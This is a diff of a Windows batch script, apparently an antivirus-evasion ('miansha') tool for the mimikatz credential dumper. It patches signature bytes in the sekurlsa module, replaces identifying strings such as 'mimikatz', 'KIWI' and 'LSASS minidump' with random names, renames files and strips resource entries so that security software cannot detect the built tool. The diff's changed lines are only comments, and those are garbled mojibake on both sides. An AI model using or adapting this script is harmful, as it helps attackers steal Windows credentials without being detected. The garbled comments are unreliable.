@@ -1,11 +1,11 @@
 @echo off
-:: Ëæ»ú×Ö·û
+:: éšæœºå­—ç¬¦
 setlocal enabledelayedexpansion
 
 set _out=
 
-@rem µ¥ÎÄ¼şĞŞ¸Ä
-:: kiwi_passwords ¹æÔò
+@rem å•æ–‡ä»¶ä¿®æ”¹
+:: kiwi_passwords è§„åˆ™
 tools\sed -b -i "s/0x33, 0xff, 0x45, 0x89/0x33, 0xff, 0x45, 0x88/g" mimikatz/modules/sekurlsa/kuhl_m_sekurlsa_utils.c
 tools\sed -b -i "s/0x33, 0xff, 0x41, 0x89/0x33, 0xff, 0x41, 0x88/g" mimikatz/modules/sekurlsa/kuhl_m_sekurlsa_utils.c
 tools\sed -b -i "s/0x4c, 0x8b, 0xdf, 0x49/0x4c, 0x8b, 0xdf, 0x48/g" mimikatz/modules/sekurlsa/kuhl_m_sekurlsa_utils.c
@@ -14,7 +14,7 @@ tools\sed -b -i "s/0x8b, 0x45, 0xf4, 0x89, 0x75/0x8b, 0x45, 0xf4, 0x89, 0x74/g" 
 
 
 
-rem mimikatzÎÄ¼şÁíÍâ
+rem mimikatzæ–‡ä»¶å¦å¤–
 call :RandomStr 5
 tools\grep.exe -rl --exclude-dir .git --exclude-dir tools --exclude-dir .idea --exclude miansha.bat "mimikatz" . | tools\xargs tools\sed -b -i "s/mimikatz/!_out!/g"
 tools\mv ./mimikatz/mimikatz.h ./mimikatz/!_out!.h
@@ -25,7 +25,7 @@ tools\mv ./mimikatz/mimikatz.vcxproj ./mimikatz/!_out!.vcxproj
 tools\mv ./mimikatz/mimikatz.vcxproj.filters ./mimikatz/!_out!.vcxproj.filters
 tools\mv ./mimikatz !_out!
 
-echo ´¦ÀíĞèÒªÖØÃûÃûÎÄ¼şµÄ
+echo å¤„ç†éœ€è¦é‡ååæ–‡ä»¶çš„
 for %%a in (_m_) do (
     call :RandomStr 5
     call :FileRC %%a !_out!
@@ -33,17 +33,17 @@ for %%a in (_m_) do (
     call :FileRen %%a !_out!
 )
 
-echo ´¦Àí²»ĞèÒªÖØÃûÃûÎÄ¼şµÄ
+echo å¤„ç†ä¸éœ€è¦é‡ååæ–‡ä»¶çš„
 for %%a in (gentilkiwi MIMIKATZ KIWI oe.eo Vincent MINIDUMP L_M_) do (
     call :RandomStr 5
     call :FileRC %%a !_out!
 )
 
-rem rcÎÄ¼şÒÆ³ı
+rem rcæ–‡ä»¶ç§»é™¤
 tools\find.exe . -name *vcxproj* | tools\xargs tools\sed -b -i -e '/ResourceCompile/d' -e '/mimikatz.ico/d'
 tools\xargs tools\sed -b -i -e '/mimidrv.rc/d' mimidrv/SOURCES
 
-rem ÆäËüÌØÕ÷×Ö·û´®Ìæ»»
+rem å…¶å®ƒç‰¹å¾å­—ç¬¦ä¸²æ›¿æ¢
 call :RandomStr 5
 tools\grep.exe -rl --exclude-dir .git --exclude-dir tools --exclude-dir .idea --exclude miansha.bat --exclude mimikatz.sln "LSASS minidump" . | tools\xargs tools\sed -b -i "s/LSASS minidump/!_out!/g"
 
@@ -57,7 +57,7 @@ call :FileRC kerberos kerBeros
 call :FileRC process Process
 
 :: =================
-:: Éú³ÉËæ»ú×Ö·û´®
+:: ç”Ÿæˆéšæœºå­—ç¬¦ä¸²
 :: =================
 ::
 :RandomStr <int>
@@ -65,16 +65,16 @@ call :FileRC process Process
     set d_StrList=QWERTYUIOPASDFGHJKLZXCVBNM
 
     set len=%d_len%
-    @rem Ëæ»ú"×îĞ¡×Ö·û¸öÊı-×î´ó×Ö·û¸öÊı"
+    @rem éšæœº"æœ€å°å­—ç¬¦ä¸ªæ•°-æœ€å¤§å­—ç¬¦ä¸ªæ•°"
     for /f "tokens=1,2 delims=- " %%a in ("%len%") do (
             set /a min_len = %%a, max_len = %%a+3
             set /a "len = %random% %% (max_len-min_len+1) + min_len"
     )
 
-    @rem ############## »ñÈ¡×Ö·û´®
+    @rem ############## è·å–å­—ç¬¦ä¸²
     set StrList=%d_StrList%
 
-    @rem ############## ¼ÆËã×Ö·û´®³¤¶È
+    @rem ############## è®¡ç®—å­—ç¬¦ä¸²é•¿åº¦
     call :StrLen "%StrList%"
 
 
@@ -86,7 +86,7 @@ call :FileRC process Process
 goto:eof
 
 :: =================
-:: ¼ÆËã×Ö·û´®³¤¶È
+:: è®¡ç®—å­—ç¬¦ä¸²é•¿åº¦
 :: =================
 ::
 :StrLen <string>
@@ -103,7 +103,7 @@ goto:eof
 goto:eof
 
 :: =================
-:: ÎÄ¼ş/Â·¾¶ÖØÃûÃû
+:: æ–‡ä»¶/è·¯å¾„é‡åå
 :: =================
 ::
 :FileRen <string> <string>
@@ -121,7 +121,7 @@ goto:eof
 
 
 :: =================
-:: ÎÄ±¾ÄÚÈİÌæ»»
+:: æ–‡æœ¬å†…å®¹æ›¿æ¢
 :: =================
 ::
 :FileRC <string> <string>
